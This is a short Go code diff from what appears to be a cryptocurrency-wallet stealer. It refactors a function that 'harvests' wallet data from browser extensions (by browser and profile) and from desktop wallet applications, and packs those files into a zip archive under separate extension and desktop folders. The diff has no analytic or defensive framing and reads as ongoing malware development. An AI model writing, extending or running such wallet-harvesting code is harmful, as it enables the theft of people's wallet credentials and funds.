@@ -30,22 +30,23 @@ func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 		entries = append(entries, archiveEntry{zipPath: name, data: data})
 	}
 
-	usedFolders := make(map[string]int)
+	extUsed := make(map[string]int)
 	for _, bundle := range recovery.CollectWalletExtensionBundles() {
-		folder := uniqueFolder(walletFolderName(bundle.WalletName, bundle.Browser, bundle.Profile), usedFolders)
+		folder := uniqueFolder(walletFolderName(bundle.WalletName, bundle.Browser, bundle.Profile), extUsed)
 		for _, e := range bundle.Entries {
 			entries = append(entries, archiveEntry{
-				zipPath:  folder + "/" + filepath.ToSlash(e.ZipPath),
+				zipPath:  zipWalletsExtension + folder + "/" + filepath.ToSlash(e.ZipPath),
 				diskPath: e.SourcePath,
 			})
 		}
 	}
 
+	deskUsed := make(map[string]int)
 	for _, bundle := range recovery.CollectDesktopWalletBundles() {
-		folder := uniqueFolder(sanitizeFilename(bundle.WalletName), usedFolders)
+		folder := uniqueFolder(sanitizeFilename(bundle.WalletName), deskUsed)
 		for _, e := range bundle.Entries {
 			entries = append(entries, archiveEntry{
-				zipPath:  folder + "/" + filepath.ToSlash(e.ZipPath),
+				zipPath:  zipWalletsDesktop + folder + "/" + filepath.ToSlash(e.ZipPath),
 				diskPath: e.SourcePath,
 			})
 		}
